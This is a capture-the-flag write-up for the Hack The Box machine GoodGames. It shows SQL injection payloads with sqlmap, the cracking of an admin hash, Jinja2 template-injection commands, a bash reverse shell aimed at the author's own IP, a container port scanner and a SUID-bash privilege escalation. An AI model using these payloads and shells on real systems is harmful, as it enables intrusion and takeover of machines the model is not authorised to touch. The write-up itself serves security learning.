# By vishok goodgames
# htb writeup
####
####
####
## Open ports in target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="info">

> Reconnaissance or footprinting is the most critical phase of a pentest, and **Nmap** is the essential tool for it. Nmap automate the reconigtion avoiding that you depend of supositions or blind attacks.
</div>

####
```perl
80/tcp  open  http
```
####
####
####
## Services that are running in the target machine
### HTTP:
If we access the website using the domain reported by **nmap**: http://goodgames.htb, we won't find anything; it's a video game store-type website, but we see no extra information such as a login or registration link. At this point, the obvious thing to do is enumeration to discover directories or files. Let's use **wfuzz**:
####
```js
wfuzz -c -u 'http://goodgames.htb/FUZZ' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 150 --hw 548,5548
```
####
| Wfuzz Param | Description |
| ----- | ----- |
| -c | Colors the displayed results |
| -u | Specifies the URL of the site to enumerate |
| -w | Specifies the path to the wordlist to use |
| -t | Specifies the number of parallel tasks to launch |
| --hw | (*Hide Word*) Hides results with a specific word count |
####
The gobuster report us the nex information:
####
```perl
000000086:   200        266 L    545  W      9267 Ch      "profile"
000000053:   200        266 L    553  W      9294 Ch      "login"
000000032:   200        908 L    2572 W     44206 Ch      "blog"
000000215:   200        727 L    2070 W     33387 Ch      "signup"
000001158:   302        3   L    24   W       208 Ch      "logout"
```
####
We have a directory with a registration and login panel, so we proceed to register and authenticate. After trying things like [*XSS*, *SSTI*, *SQLI*], the site doesn't respond to any, but if we use the email: admin@goodgames.htb, we see a message: *The user already exists*. 
####
This means the **email** field is probably vulnerable to a more sophisticated attack. So we will use **sqlmap** to perform a SLQi [*SQL Injection*] attack; the first step is to determine if it is really vulnerable.
####
### SQLI
To perform an injection, we need the **cookies** given when we log in, as well as other necessary fields. For this, we need to intercept the login request with **Burpsuite** to generate an **item** in *XML* format to pass to sqlmap: `sqlmap -r intercepted_request`. Once sqlmap finishes evaluating the request, it shows us this on the screen:
####
```perl
Parameter: email (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: email=admin@goodgames.htb' AND (SELECT 7256 FROM (SELECT(SLEEP(5)))HFQo) AND 'lZjy'='lZjy&password=12345

Type: UNION query
Title: Generic UNION query (NULL) - 4 columns
Payload: email=-7226' 
    UNION ALL SELECT NULL,CONCAT(
        0x7171707171,
        0x517650446e62534f666c7165446e63656c5854757861644c576b57627a41756376534c46704b7947,
        0x716a717071
    ),
    NULL,NULL-- -&password=12345
```
####
| Sqlmap Param | Description |
| ----- | ----- |
| --tables | Enumerates tables |
| --columns | Enumerates columns |
| -r | XML file with the request |
| -T | Specifies the table to dump |
| --dbs | Database discovery |
| --dump | Dumps tables or columns as specified |
####
### SQLI discovery databases:
Now that we know it can be exploited with injections: [*Time Based*, *Union Query*], we can use the **dbs** parameter to dump the database contents.
####
```perl
sqlmap -r intercepted_request --dbs
```
####
### SQLI dump tables:
With the previous command, **sqlmap** reports 2 databases on the machine; now we need to dump the tables in those databases.
####
```perl
sqlmap -r intercepted_request --tables --dump
```
####
### SQLI dump columns:
With the previous command, sqlmap reports 82 tables on the machine; now we need to dump the columns in the **admin_users** table, which is probably where valid users are.
####
```perl
sqlmap -r req --T user --columns --dump
```
####
#### Crack passwords:
In this case, sqlmap conveniently dumped the contents of the **user** table columns for us, but if we hadn't used the **-C** parameter to specify the columns to dump. The passwords seem to be in *MD5* format, so we need to crack them. First, let's use an online tool called **Crackstation**: https://crackstation.net/. The password for the `admin` user is `superadministrator`.
####
####
####
## First exploitation phase
### Subdomain:
When we log in as **admin**, at the top there's a nav with a **settings** icon; clicking it takes us to a new subdomain: http://internal-administration.goodgames.htb/. If we add it to `/etc/hosts` and access it, it takes us to the following section:
####
<div class="img">
    <img src="/machines/public/goodgames/1.png" loading="lazy" decoding="async" />
</div>

####
It appears to be an administration dashboard; we don't know the credentials, but we have those for **admin**, so if we try `admin:superadministrator`, we gain access as the admin user in the dashboard. Earlier we saw **Flask**, so Python might be running in the background.
####
If we start browsing, we see nothing; there are sections and buttons without actions. But there is a section to configure the personal information of the **admin** user.
####
<div class="img">
    <img src="/machines/public/goodgames/2.png" loading="lazy" decoding="async" />
</div>

####
This form is functional, so if we fill in the information, some section should update:
####
<div class="img">
    <img src="/machines/public/goodgames/3.png" loading="lazy" decoding="async" />
</div>

####
If we see our input reflected in the form, it could be a clear indication that this section is vulnerable to SSTI [*Server Side Template Injection*], and since Python with **Flask** is running in the background, it could be vulnerable to **Jinja**, for example. Let's test by entering `{{7*7}}` in the `Full name` field.
####
<div class="img">
    <img src="/machines/public/goodgames/4.png" loading="lazy" decoding="async" />
</div>

####
Indeed, the result of the operation is reflected in the **Profile Card**. We need to look for payloads that use double curly braces `{{` to try to generate a reverse shell and gain access to the victim machine.
####
### Jinja2
If we look for payloads to exploit *SSTI* on sites like: https://github.com/swisskyrepo/PayloadsAllTheThings, we'll find many payloads to read files and execute commands. The idea is to determine if we can execute system-level commands:
####
```perl
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
####
This payload shows us the root user's id in the **Profile Card**, so if we gain access, we would do so as the highest-privileged user. Let's check if the victim machine can communicate with us; we'll listen with **tcpdump** to intercept *ICMP* traffic and modify the payload so that instead of executing the `id` command, it does a ping:
####
```perl
Target machine ->
sudo tcpdump -i tun0 icmp
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 10.10.16.6').read() }}

Local machine ->
22:26:26.036789 IP goodgames.htb > 10.10.16.6: ICMP echo request, id 398, seq 1, length 64
22:26:26.036817 IP 10.10.16.6 > goodgames.htb: ICMP echo reply, id 398, seq 1, length 64
```
####
We receive the ICMP trace, so we'll try running different one-liners, since we don't know if the system has tools like **nc**, **bash**, or if it performs any sanitization.
####
```perl
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /de/tcp/10.10.16.6/1234 0>&1"').read() }}
```
####
####
####
## Second exploit phase (Privilage Escalation)
### Docker:
Unfortunately, if we run the `ifconfig` command, we'll realize we are inside a container, so we'll need to escape it and target the real machine. But not before retrieving the flag, which we have access to. We are in container `172.19.0.2`, but if we are two, who is 1? We'll perform internal port enumeration. It would be much easier to do it in Python, but for that, the machine must have it installed. If we run:
####
```bash
which python
```
####
The machine returns the **path** where it is located, so it is installed.
####
```python
#!/usr/bin/python3
import os
from time import sleep

def main():
    for port in range(0, 200):
        sleep(0.5)
        os.system(f'bash -c "</dev/tcp/172.19.0.1/{port} 0>&1" 2>/dev/null && echo "{port} open"')

if __name__ == '__main__':
    main()
```
####
| Script param | Description |
| ----- | ----- |
| </dev/tcp | The less-than symbol before **/dev/tcp** indicates data will be sent, not connections; if it responds, the port is active. |
####
We see in the terminal that the script reports port **22** open, we have the users `root` and `augustus`. We could try the password for the container's admin user, which is: `superadministrator`, so we gain access as the augustus user.
####
### Bash
Although the flag is not inside the container, we are **root** and have the highest privileges. Something we can do is copy binaries from `/bin` to a directory where we have permission. As the **augustus** user, we have permission in our `/home`, so we'll copy the **bash** binary.
####
```bash
cp /bin/bash /home/augustus/
```
####
Now we'll switch back to the **root** user in the container and change the permissions of that binary:
####
```bash
chown root:root bash
chmod 4755 bash
```
####
We're changing the **Owner** of the binary to root, not of the container, but of the victim machine, and assigning the *SUID* permission *4755* to that binary so it can be executed as root. We return to the **augustus** user and run the binary: `./bash -p`
####
<div class="info">

> The **-p** parameter disables protections, causing it to run with maximum privileges thanks to the **SUID** permission.
</div>
